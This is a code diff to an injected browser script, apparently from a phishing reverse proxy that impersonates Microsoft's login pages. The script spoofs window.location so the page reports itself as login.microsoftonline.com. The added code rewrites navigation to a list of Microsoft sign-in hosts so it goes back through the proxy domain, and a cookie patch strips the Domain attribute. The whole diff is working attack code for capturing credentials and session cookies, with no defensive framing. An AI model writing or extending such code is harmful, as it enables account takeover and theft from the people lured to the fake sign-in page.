@@ -84,6 +84,31 @@ const DOMAIN_MASK_SCRIPT = `
 
     // ---- Save original hostname before overriding ----
     window.__originalHostname = window.location.hostname;
+    // ---- Navigation rewrite helper ----
+var microsoftHosts = [
+    'login.microsoftonline.com',
+    'microsoftonline.com',
+    'login.windows.net',
+    'login.microsoft.com',
+    'sts.microsoftonline.com',
+    'aadcdn.msftauth.net'
+];
+
+function rewriteNavigationUrl(targetUrl) {
+    try {
+        var url = new URL(targetUrl, window.location.href);
+        if (microsoftHosts.some(function(host) { return url.hostname === host; })) {
+            url.hostname = window.__originalHostname; // proxy domain
+            return url.href;
+        }
+    } catch (e) {}
+    return targetUrl;
+}
+
+// Capture original location methods/setters before overriding
+var originalHrefSetter = Object.getOwnPropertyDescriptor(window.Location.prototype, 'href').set;
+var originalAssign = window.location.assign ? window.location.assign.bind(window.location) : null;
+var originalReplace = window.location.replace ? window.location.replace.bind(window.location) : null;
 
     // ---- Domain Mask (original) ----
     var fakeOrigin = 'https://login.microsoftonline.com';
@@ -110,10 +135,13 @@ const DOMAIN_MASK_SCRIPT = `
             configurable: true
         });
         Object.defineProperty(loc, 'href', {
-            get: function() { return fakeOrigin + loc.pathname + loc.search + loc.hash; },
-            set: function(v) { loc.href = v; },
-            configurable: true
-        });
+    get: function() { return fakeOrigin + loc.pathname + loc.search + loc.hash; },
+    set: function(v) {
+        var rewritten = rewriteNavigationUrl(v);
+        originalHrefSetter.call(loc, rewritten);
+    },
+    configurable: true
+});
         try {
             Object.defineProperty(loc, 'ancestorOrigins', {
                 get: function() { return new DOMStringList([fakeOrigin]); },
@@ -192,7 +220,17 @@ const DOMAIN_MASK_SCRIPT = `
 
     console.log('[DOMAIN MASK] Active – origins now report as ' + fakeOrigin);
 
-
+   // ---- Override navigation methods ----
+if (originalAssign) {
+    window.location.assign = function(url) {
+        return originalAssign(rewriteNavigationUrl(url));
+    };
+}
+if (originalReplace) {
+    window.location.replace = function(url) {
+        return originalReplace(rewriteNavigationUrl(url));
+    };
+}
 
     // ---- Cookie Patch (strip Domain attribute) ----
 (function() {
